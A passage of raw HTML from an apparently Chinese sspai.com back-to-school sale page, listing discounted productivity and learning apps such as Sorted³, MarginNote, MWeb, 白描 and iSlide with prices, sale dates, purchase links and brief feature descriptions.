target=\"_blank\">淘宝活动专区</a></p>\n<p>📝 欢迎前往 <a href=\"https://sspai.com/page/school\">开学季专题页</a>，查看更多开学季活动内容。</p>\n<p>🎁 文末还有少数派 &amp; GoodNotes 联名开学礼包免费下载，不要错过。</p>\n<h2>Sorted³ 工具升值包</h2>\n<ul>\n<li>💰 价格：iOS + macOS 捆绑包 <s>¥238</s> → ¥198</li>\n<li>📱 支持平台：iOS、macOS</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/282\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654515525324\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>在 Sorted 开发团队看来，基于 Project Catalyst 开发而来的 Sorted³ for macOS，虽然最重要的功能是补全 Apple 生态的「最后一块拼图」，但作为桌面端推出的 macOS 版本能借助更多更灵活的快捷键使用，让任务的整理与收纳都来得更加高效。</p>\n<p>​如果你已经是 Sorted³ 的 iOS 或 iPadOS 版本的用户的话，那你也一定对这款应用所主打的「超调度」（Hyper Scheduling）设计并不陌生：这一设计理念，可以说是 Sorted 相比于其他 GTD 工具的最显著的设计区别，但主要的目的，仍然是借助高效但精确的任务调度，让任务安排能在日常生活中各种突发情况发生时仍然保持有条不紊。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/12/14/article/90ac42c96f3c27213b5c57c7fca90256?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>和 iPadOS 与 iOS 不同，macOS 相较于移动端一个重要的区别在于：借助实体键盘、Trackpad 以及鼠标，Sorted 其实能更加高效地完成整理工作，而且桌面端往往也是更多人习惯于工作的环境。</p>\n<p>在 macOS 版本中，「利用组合键减少使用时的重复操作提升效率」是操作中提升效率的重要内容：比如在 Sorted³ 的 iOS 版本中，键盘上方的加号一直被认为是一个颇具巧思的设计，这个设计能在任务整理阶段提升录入任务的效率，让思考不被打断，一气呵成地将接下来要完成的预定工作都收纳进列表中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2018/08/29/df0b14af4d46cc8b96d03b28520cd848.gif\" alt=\"\"></figure><p>除此之外，Sorted 还为任务的日程安排设计了让人眼前一亮的「自动计划」：只需要预设好每个任务的预定时间，结合番茄工作法的相关元素，设置好相邻任务之间一段供缓冲及休息的时间，就可以自动生成一份接下来所有任务的排序，同时自动在多平台同步设置好提醒事项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/01/6f12965b0e4a91afc44d6f7c29092a77.gif?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>​这种内置的自动化流程另一个优势在于，即使一项任务超期，保证接下来的计划都能继续按照新的计划进行，同时也自动避开诸如用餐、会议等固定事件带来的冲突，并做出相应的推后调整，可以说将重新调整计划的成本降到了最低。</p>\n<p>基于同样的操作逻辑，在 macOS 版本中，通过键盘快捷键 Command + N，就能快速地整理主要任务，我就已经习惯了一气呵成地将预定任务输入进 Sorted³ 中，然后再根据信息为每一个任务分配时间以及将更加详细的信息写入任务备注中。</p>\n<p>而在任务备注中，除了新加入的快捷键操作之外，Sorted³ 内容中类 Markdown 语法的富文本编辑也是其高效设计的一部分，Sorted³ 为任务备注采用了类似 Notion 的富文本混合 Markdown 语法设计，不仅能让任务记录界面更加简洁直观，而且还让备注充当了更多功能，除了能直接列清单之外，还能直接在任务备注中创建子任务，并借助重新整理功能将其重新生成为多个新任务。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/64041\">帮你更高效地安排任务和日程，Sorted³ 推出 Mac 版</a></li>\n<li><a href=\"https://sspai.com/post/46948\" target=\"_blank\">以时间计划为核心，这款应用想要帮你更智能地管理任务：Sorted³</a></li>\n</ul>\n<span class=\"ss-genuineSoftware\" product-id=\"282\" type=\"genuineSoftware\"> </span><h2>Moon FM</h2>\n<ul>\n<li>💰 价格：桌面版 <s>¥68</s> → ¥34</li>\n<li>📱 支持平台：macOS、Windows</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/280\" target=\"_blank\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654822626683\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>Moon FM 整体设计简洁素雅，但多彩的图标为其加分不少。与 Pocket Casts 不同，Moon FM 的首页以时间线方式呈现，帮你快速找到近期更新内容。你也可以通过上方功能区域管理订阅、下载、收藏、历史等。</p>\n<p>Moon FM 的播放界面同样简约，但并不简单。你可以利用播放列表、睡眠定时、速度调整和均衡器等个性化收听进程。最小化后，它会收起成屏幕边缘的小图标，可以拖动调整位置。</p>\n<p>除了播客外，Moon FM 还支持上百个国家的网络电台，包括 CNR 各频道及国内的各地方广播等，<s>可谓出租车司机必备</s>。如果你正在学习小语种，也不失为练习听力的佳选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/01/fd1bba75174bcca247dca53e75db0124.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><span class=\"ss-genuineSoftware\" product-id=\"280\" type=\"genuineSoftware\"> </span><h2>Microsoft 365 工具升值包</h2>\n<ul>\n<li>💰 <strong>限时立减 ¥20，再送微软定制鼠标垫</strong>\n</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">点击购买</a>\n</li>\n</ul>\n<p>在少数派购买 <strong>Microsoft 365 工具升值包</strong>，你将获得：</p>\n<ul>\n<li>Microsoft 365 订阅权限</li>\n<li>累计<strong>超八万字</strong>的 Microsoft 365 定制内容</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/08/d6c3b486aa786549a1e8ec6d97dd37e1.png\"></figure><p>设计讲师 <a class=\"ss-atUser\" data-mention=\"@艾伦习字\" user-id=\"bs2pba5b34tcs0pnc6ig\" href=\"https://sspai.com/u/keantares\">@艾伦习字</a> 有着丰富的大型公司发布会幻灯片的制作经验。他从实战经验中，总结出了幻灯片制作的三阶段理论。通过他的经验分享，来剖析制作幻灯片的流程和技巧。</p>\n<p>少数派资深作者 <a class=\"ss-atUser\" data-mention=\"@子不语Rex\" user-id=\"bs2oufdb34tch2788ehg\" href=\"https://sspai.com/u/hpx14j8g\">@子不语Rex</a> 将借助实际的工作实例，来分析 Excel 的使用方式，分享他的高效使用 Excel 的技巧。</p>\n<p>Word 系列将由少数派资深作者 <a class=\"ss-atUser\" data-mention=\"@PlatyHsu\" user-id=\"bs2p0qtb34tch278vgn0\" href=\"https://sspai.com/u/platyhsu\">@PlatyHsu</a> 制作，深入 Word 文档的设计机制，剖析文档中重要元素的设置以及背后的原理。</p>\n<p>从即日起至 8 月 11 号，Microsoft 365 工具升值包限时特惠，额外再送<strong>微软定制鼠标垫</strong>：</p>\n<ul>\n<li>15 个月个人订阅：<s>¥329</s> -&gt; ¥309</li>\n<li>15 个月家庭订阅：<s>¥359</s> -&gt; ¥339</li>\n<li>12 个月个人订阅：<s>¥279</s> -&gt; ¥259</li>\n</ul>\n<p>活动期间购买 Microsoft 365 工具升值包 <strong>15 个月订阅版本</strong>，还可免费额外获赠微软定制鼠标垫。</p>\n<p>请注意：如果你希望获得赠送的微软定制鼠标垫，请在 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">少数派淘宝正版软件商店</a> 下单购买，以便我们能获得你的收件信息，以最快的速度将鼠标垫送到你手上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/8ac785121b9a28852c3f479c637cc691.jpeg\"></figure><p>如果你想单独购买 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=639368780380\" target=\"_blank\">微软定制鼠标垫</a><strong> ，</strong>我们也会向你发放「满 309 减 79 元优惠券」<sup class=\"ss-footnote\" href=\"\" title=\"在淘宝应用内确认收货（收货时间可超过活动时间）后，通过淘宝消息发放优惠券。\" footnote-id=\"1\">1</sup>，之后可以在少数派网站内购买 Microsoft 365 工具升值包 （优惠券有效期至 9 月 5 日）。</p>\n<span class=\"ss-externalProduct\" title=\"Microsoft 365 工具升值包\" type=\"externalProduct\" link=\"https://item.taobao.com/item.htm?ft=t&amp;id=638827544500\" through-price=\"279\" price=\"259\" cover=\"https://cdn.sspai.com/2021/07/21/7276668ac283d7fa1080c18960c8c1b2.png\" description=\"下单享优惠，还送微软定制鼠标垫。\" date-start=\"2021-07-28\" date-end=\"2021-08-11\"> </span><h2>MarginNote</h2>\n<ul>\n<li>💰 价格：<s>¥280</s>→¥196</li>\n<li>📱 支持平台：macOS</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/42#192\" target=\"_blank\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=646651281303\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>致力于把书「读薄」的 MarginNote 拥有多种不同视图，你可以在文档视图下划出重点，随后在思维导图下来理清它们之间的关系，最后在复习界面将它们消化掉。花点时间适应一下 MarginNote 的逻辑，你也能用它来高效汲取书本里的知识。对于学生党来说，MarginNote 或许能成为你消化知识的得力助手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2018/09/29/d98ac44bce47eda05040e18daa1cebc8.gif?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/47547\" target=\"_blank\">如何高效把书读「薄」？开发了这款强大学习工具的他有话想说：专访 MarginNote</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"42\" type=\"genuineSoftware\"> </span><h2>MWeb Pro</h2>\n<ul>\n<li>💰 价格： <s>¥128</s>→¥76.8</li>\n<li>📱 支持平台：macOS</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/13#507\" target=\"_blank\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654009587094\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>MWeb 是一款 macOS 上体验优秀的 Markdown 应用，在 Markdown 编辑器同质化严重的今天，MWeb 以其出色的功能和体验独树一帜：</p>\n<ul>\n<li>跨 macOS 和 iOS 的双平台；</li>\n<li>内置灵活的文档库管理功能；</li>\n<li>支持在应用内生成和发布静态博客，并用 GitHub 等平台托管图片资源；</li>\n<li>可以直接发布文章到 WordPress、Medium、新浪博客等平台；</li>\n<li>支持以标签管理 Markdown 文档；</li>\n<li>可用于搭建个人 Wiki 知识库。</li>\n</ul>\n<p>如果你需要这些功能，那么 MWeb 将是你的不二选择。作为一款专业的 Markdown 写作、记笔记、静态博客生成软件，MWeb 在今天带来了 Mac 版的 4.0 更新，4.0 版最大的亮点自然是 One Markdown 那套新编辑器的整合，新编辑器完整支持 CommonMark 标准和 GitHub Flavored Markdown (GFM)，并对 HTML 语言支持进行优化。可以更好地展现代码块和 HTML 内容。性能也随之有所提升，处理上百万文字的文档不会总处于崩溃边缘了。新版编辑器还对诸如表格绘制、数学公式、图片显示等功能进行了优化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4d2untb34tb0b5qh4mg.png\" alt=\"\"></figure><p>除了编辑器的优化外，4.0 版的外观设计也保持与 One Markdown 的统一。图标采用了「大一统」下更为方正的设计，功能按钮被浓缩在顶栏之中，页面看起来更为简洁精炼，进一步解放了编辑区空间，当然这也要求你对语言有更高的熟练度。图片展示也有所优化，不仅增加了多格式的网络图片显示支持，还增加了上传图片的独立窗口，你可以查阅近期上传的所有图片，方便随时调用。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"13\" type=\"genuineSoftware\"> </span><h2>专注笔记</h2>\n<ul>\n<li>💰 价格：一年订阅 <s>¥118</s>→¥106.2</li>\n<li>📱 支持平台：macOS、Windows、iOS、Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/185#330\" target=\"_blank\">点击购买</a>\n</li>\n</ul>\n<p>作为一种特殊场景，课堂环境意味着讲师总是通过口述配合演示的方式传授知识，对于口述这一方式而言，信息的流动是时序的、一维的、单向的1，所以为配合这种方式。最好的课堂记录结构应是大纲式结构，其他所有内容都作为附件或备注注解于主结构中。大纲式结构保证了知识点的包含关系，但仍旧是以从上至下的顺序进行输入，最大程度地保有了课堂知识的陈述逻辑。</p>\n<p>Focus Note 恰恰精准地使用了大纲输入，使用 Markdown 语法的 # 号快速标记大纲锚点并对课堂内容分层，同时点击左侧标记还能够自然展开或折叠该层内容。教师的输出与学生的接受获得同步，学生得闲对教师内容进行咀嚼和消化，当堂内容便可以有效进行粗处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/03/25/a387af6ea8523a372183fc6693a072ab.gif\" alt=\"\"></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/65682\">我心目中的最佳课堂笔记 App：专注笔记 Focus Note</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"185\" type=\"genuineSoftware\"> </span><h2>白描</h2>\n<ul>\n<li>💰 价格：黄金版<s>¥40</s>→¥25</li>\n<li>📱 支持平台：macOS、Web、iOS、Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/44#383\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=647267487623\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>白描是一款识别图片文字的 OCR 应用，特点是可以直接在相册进行识别，并且能对文字进行编辑。</p>\n<p>白描应该是第一款真正意义上的包含批量文字识别功能的 OCR 软件，而他开启进入批量识别模式的方式也不会让软件的界面显得赘余。</p>\n<p>长按一张图片，即可进入批量识别模式，然后点击其他图片进行多选即可，如下图左图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2017/09/03/af51728f847ec63426dae2888e149d65.jpg\" alt=\"\"></figure><p>多选之后即可进入批量识别界面，如上图右图所示，在批量识别界面可以设置任何一张图片的识别语言，识别完成之后可以进入任何一张图片选择需要的文字，全部识别完成之后，最下面的大按钮会变为「合并并查看文字」，点击即可去识别结果页面查看所有文字，并对所有图片和文字进行校对。</p>\n<p>经过很多用户朋友的反馈，最终决定为白描加入翻译功能，目前，白描支持简体中文、日语、英语、韩语、法语、西班牙语、阿拉伯语、俄语、德语、葡萄牙语、意大利语、繁体中文、粤语、文言文的互译。</p>\n<p>进入翻译功能也很方便，如下图左图，在识别结果页面的下方工具栏即可找到入口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2017/09/03/a1c4d2424726c93792a18d2eb287ca48.jpg\" alt=\"\"></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/47838\">也许是中文 OCR 识别效果最出色的扫描应用：白描</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"44\" type=\"genuineSoftware\"> </span><h2>「白描 + 白描证件照」捆绑包</h2>\n<ul>\n<li>💰 价格：白描黄金版 + 白描证件照 <s>¥46</s>→¥30</li>\n<li>📱 支持平台：macOS、Web、iOS、Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/44#383\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654447201020\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>生活和学习中总是不免会用到证件照，比如参加什么考试的网络报名；比如要制作简历却发现手边没有证件照，想去照相馆周边还不一定有，想自己做一张，奈何 PS 水平一般，抠图抠不好……</p>\n<p>这种情况下，《白描证件照》这款 App 就可以帮到你。看到这个名字，你可能会问，和那个 OCR 文字识别软件《白描》有关系吗？是的，有关系，一个开发者开发的，本想把这个功能作为白描 App 扫描功能的一个子功能，但因为是纯离线制作证件照，体积太大，就单独做成了一个 App。</p>\n<p>《白描证件照》是一款可以自动抠图、更换背景并且可以美颜的证件照 App，值得一提的是，与很多其他证件照 App 不一样，这款证件照 App 所有的操作都可以在设备上离线完成，无需把人脸上传到服务器就可以完成抠图制作，大大保障了隐私安全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/01/10/d04404592e09e22549a3cb51402b9939.jpg\" alt=\"\"></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/64496\">标准好看的证件照，用手机就能轻松搞定：白描证件照</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"44\" type=\"genuineSoftware\"> </span><h2>Markdown.app</h2>\n<ul>\n<li>💰 价格：<s>¥68</s>→¥45</li>\n<li>📱 支持平台：macOS</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/86#341\" target=\"_blank\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=646653249734\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>一个写作工具，会追求不受干扰、有时也称之为沉浸式写作，在一个写作型 App 中比较常见的是有种模式，叫禅模式。</p>\n<p>在 Markdown.app 中设计了全新的禅模式。很多个细节处理后，有看得见的部分、有隐藏的部分、还有听得见的部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2020-04-12/Screen%20Shot%202020-04-14%20at%203.28.08%20PM.png\" alt=\"\"></figure><p>有人在这个模式下，偏好全屏的状态。我更喜欢默认的窗口尺寸和隐隐落落的背景，不会影响到写作的注意力。真若乏了，起身、歇一会儿，再回到屏幕前，很容易重新进入原来的写作状态。</p>\n<p>Markdown.app 禅模式目前可供选择的白噪音只有两个，可能信源不对，一直没有找到合适的付费版，反而在免费来源里，遇到两个合适的，非常巧合，全部来自于 klankbeeld，感谢。</p>\n<p>针对中文的词性分析，是比较罕见的，特别是在偏向于个人的写作工具领域，更是近乎没有。</p>\n<p>词性分析有什么用呢？一般情况下，如果要精修一篇文章时，我会标注连词 + 代词，通过减少它们的使用，往往能明显提升文稿的质量。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2020-04-12/Screen%20Shot%202020-04-13%20at%202.30.04%20PM.png\" alt=\"\"></figure><p>这里花花绿绿是因为全部词性标注出来了，实际场景并不需要如此</p>\n<p>由于历史原因，多数 Markdown 解析后的 HTML，无法满足行首缩进 (两字) 的排版要求。</p>\n<p>而且长时间在电子设备 (包括小屏设备) 上的阅读，包括我自己，潜移默化中也产生了一种偏好，那就是不用行首缩进。有时也会看到大家在争议，是否有必要行首缩进呢？</p>\n<p>在中文环境下，写好文章发布到公众号，也是一种需求。Markdown.app 提供了一些公众号排版样式的生成器，设置项少的也有近 20 个，略作调整，确定好排版之后，未来一键点击即可复制公众号格式，极大地降低了排版的时间。</p>\n<p>Markdown.app 导出的公众号格式，也支持代码高亮、数学公式。但如果要进一步完全自定义，则需要自己定义 CSS 了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2020-04-12/Screen%20Shot%202020-04-13%20at%202.46.10%20PM.png\" alt=\"\"></figure><span class=\"ss-genuineSoftware\" product-id=\"86\" type=\"genuineSoftware\"> </span><h2>iSlide 工具升值包</h2>\n<ul>\n<li>💰 价格：12个月 <s>¥99</s>→¥79，15个月 <s>¥124</s>→¥94</li>\n<li>📱 支持平台：macOS，Windows</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/12#462\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=647807696824\" target=\"_blank\">淘宝购买</a>\n</li>\n</ul>\n<p>相比「办公三剑客」中的 Word 和 Excel，PowerPoint 的制作不仅考验我们的专业能力，还对使用者的审美能力提出了要求。</p>\n<p>而 iSlide 则是我们的高效应对之道，它可以以最少的时间，做出一份设计美观、内容清晰的幻灯片。</p>\n<p>从头到尾一张张自己做 PPT，不仅累，而且效果不一定好。如果一开始就有模版可以参考，无疑能大幅度提高工作效率。</p>\n<p>iSlide 的案例库包含了相当多第三方制作的成品 PPT，还可以根据关键字直接搜索别人做好的成品寻找灵感。如果案例和你要做的主题很契合，你甚至可以直接基于这些第三方的 PPT 进行「二次加工」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/13/30318dfb99a199ba75a09b3a14245e78.png\" alt=\"在 PowerPoint 窗口中直接搜索主题\"></figure><p>相比微软 Office 自带的区区几十种主题模板，iSlide 提供的主题可以说是堪称海量。这里在 PPT 上方的导航标签页中切换到 iSlide，然后点击主题库就可以在右边的窗格浏览这些制作精美的主题了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/13/a1aa6201f8e8a3e6783fdf753d6b58b9.png\" alt=\"多种调色盘可选\"></figure><p>选择好主题模板之后，就可以确定 PPT 的主题配色了。iSlide 的配色库可以完美解决这些问题，这里的配色库涵盖了一些经典配色以及企业配色方案，并且支持单个幻灯片应用配色或者一键式全部应用，相比以往手动一页页地改配色要省时省力得多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/13/dc8cef8399a0c18ce5a0cf609ebdbd6f.png\" alt=\"直接搜索图标和图片素材\"></figure><p>在制作 PPT 的过程中，我们往往通过大量的图表、图标、插图来丰富内容，相比文字更具有说服力，但这也是在制作 PPT 中最为费神的部分。PowerPoint 提供的默认素材单调、种类少，iSlide 则拥有大量新鲜的素材补充，直接在右侧窗格上点选搜索就可以直接应用在 PPT 上，着实让制作过程轻松不少。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67161\">iSlide 工具升值包，比同事早下班的秘密武器</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"12\" type=\"genuineSoftware\"> </span><h2>50 音起源</h2>\n<ul>\n<li>💰 价格：<s>¥12</s>→¥6</li>\n<li>📱 支持平台：Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/72#157\" target=\"_blank\">点击购买</a>\n</li>\n</ul>\n<p>在我初中自学日语的时候，五十音作为大家最开始也是最难的一部分，我并没有什么聪明的办法去学习，只能用暴力方法一遍一遍地读，一遍一遍地在脑海中生成印象，才跨过学习日语的第一道难关。现在，我们不如从背后的文化开始，一步一步地让我们从心灵中记住假名的来源。今天为大家介绍的这款 50 音起源 来自国内知名的独立开发者周楷雯，它利用了日语 50 音的起源，来帮助我们更好地学习日语里基础中的基础。</p>\n<p>在应用的第一个 tab，开发者为你准备好了应用中最为重要的部分之一——假名的起源供你阅读。在这里，各种假名通过汉字的书写变化为使用者们清晰地表示了假名的进化过程。比起使用暴力方法记忆假名，使用自己的母语做形象记忆，说不定是一个更有效的学习方法。同时，在阅读起源的过程中，学习语言背后的文化，也不失为学习语言中重要的一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2018/11/18/135f8ef595990e4fc14cfa6ab96f2a4a.jpg\" alt=\"学习假名的起源\"></figure><p>在应用的第二个 tab，「速查」功能提供了一个基本的五十音图表供你查询。同样，这不仅仅是一个简单的表格，如果你单独点击每个假名，应用会帮你发音，并且会显示平假名和片假名两种假名的字源，帮助你加深印象。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2018/11/18/2f96c09e4e0540e27ba59a326b13f03c.gif\" alt=\"点击假名会显示字源，并且支持发音\"></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/48371\">一起用探索起源的方法，来学习日语 50 音：50 音起源 | App+1</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"72\" type=\"genuineSoftware\"> </span><h2>捧读</h2>\n<ul>\n<li>💰 价格：<s>¥68</s>→¥54.4</li>\n<li>📱 支持平台：Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/191#347\" target=\"_blank\">点击购买</a>\n</li>\n</ul>\n<p>市面上的日语学习 App 不少，但当我真的开始学习日语时，发现它们大多只是对现有教材的内容拆解和翻译，不能引起我的学习兴趣。</p>\n<p>因此，为了满足自己的日语学习需求，也为了搞定难啃的日语语法，我开发了「捧读」，希望能对你的日语学习有所帮助~</p>\n<p>捧读通过机器学习，可以帮助你分析一段日语的语法，进行断句，词性分析，语义结构整理，并且可以进行查词，朗读，翻译。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2020/03/30/0246d8899e35c67dc075516de41775ea.png\" alt=\"捧读分析界面\"></figure><p>不仅如此，为了能够使得软件在任何时候都可以使用，除了翻译、扫描以外的功能，都是「离线」工作的，因此你不需要担心自己所处的环境，甚至在飞机上也可以从容学习。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/59705\">「捧读：日语语法学习与分析」的开发幕后思考</a></p>\n<span class=\"ss-genuineSoftware\" product-id=\"191\" type=\"genuineSoftware\"> </span><h2>阅读记录</h2>\n<ul>\n<li>💰 价格：9 折</li>\n<li>📱 支持平台：iOS、Android</li>\n<li>⏰ 优惠时间：2021.09.03-2021.09.09</li>\n<li>🛒 <a href=\"https://sspai.com/item/193\" target=\"_blank\">点击购买</a>\n</li>\n</ul>\n<p>要想深入地阅读一本书可能不仅仅只是「翻阅」，事实上想要让书本内容真正被我们认知消化可并不简单——持之以恒的阅读、定时的笔记等都不可少，而现在我们可以依靠一些 App 来进行辅助，从而让阅读更加高效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/05/article/4f3c5784de3bbce00bf597265636f3a5?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>「阅读记录」是一款可以帮助你更好地读书的小工具——和很多打卡应用类似，「阅读记录」首先抓住打开书阅读这一基本诉求，通过「数据统计」以及「读书日历」来量化阅读的时间量，从而逐步养成每日的定时阅读，并且可以衡量在使用 App 后读了哪些书，每天的阅读时间等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/05/article/e5b1d481c5c74c04169511ffb84614f4?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>在「阅读记录」中还可以通过一系列的工具来记录阅读的书，无论你是阅读纸质书还是电子书，通过搜索、扫描 ISBN 码和手动录入来将喜爱的书籍存入 App 中。当然对于一些数字阅读平台还可以通过一系列的操作将数据导入进来，还可以自动生成一系列的阅读书单。在进度管理上，你也可以为书籍指定类型，比如纸质书用页数来代表进度，而电子书则可以选择使用百分比来显示。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2020/10/05/article/0a7df6b86975f453e45e5b32fd08936c?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>在书籍管理上，「阅读记录」提供了「书架」「阅读状态」和「标签」三个维度帮你管理书籍。其中「书架」类似于文件夹，你可以通过书籍存放的位置（比如 Kindle 、微信读书和房间书架）等方式来管理书籍。而「标签」则可以用于更加细致地区分书籍，比如这本书是「魔幻现实主义」还是「浪漫主义」。</p>\n<p>「阅读状态」代表这本书当前的状态，比如是「在读」还是「想读」，又或者是已经「弃读」了。在书籍列表中，所有书籍都会按照阅读状态分类好，默认只聚焦于正在读的书，左右滑动即可查看其它状态下的书。当你把书籍导入以后，你就可以直接从某一本书开始阅读计时。计时结束后，你还可以更新阅读进度，这些数据都会被应用计入「数据统计」以供参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/05/article/9f8434972c6c9e600fe575a8284d5d57?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>想要深入地阅读书籍，那么做笔记当然是少不了的，「阅读记录」也提供了类似的功能来记录数字笔记，比如导入照片、OCR 等方式添加笔记。如果你是微信读书的用户，还有更加便捷的方法来快速导入大量笔记。你只需要在书籍详情页点击右上角的「…」，并选择「导入微信笔记」，随后根据教程逐步操作即可。同样你还可以通过多种的导出方式将笔记导出持 TXT、PDF 格式或导出至印象笔记。如果你希望分享某条特定的笔记，也可以在书摘界面进行分享，在调整好图片效果后即可在社交平台分享。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/05/article/8ad7c0d9d69e348f6db549c66f0519d1?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>总体来说，阅读记录是款值得一试的阅读管理 App。如果你喜爱书籍，却因为各种原因经常读不下书，不妨用它来培养阅读习惯。如果你已经有良好的阅读习惯，阅读记录也能成为你管理书籍、笔记，甚至是帮你理清书架的好帮手。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"193\" type=\"genuineSoftware\"> </span><h2>纯纯写作</h2>\n<ul>\n<li>💰 价格：<s>¥125</s>→¥98</li>\n<li>📱 支持平台：Android</li>\n<li>⏰ 优惠时间：2021.08.27-2021.09.05</li>\n<li>🛒 <a href=\"https://sspai.com/item/48#184\" target=\"_blank\">点击购买</a> | <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=642677441514\" 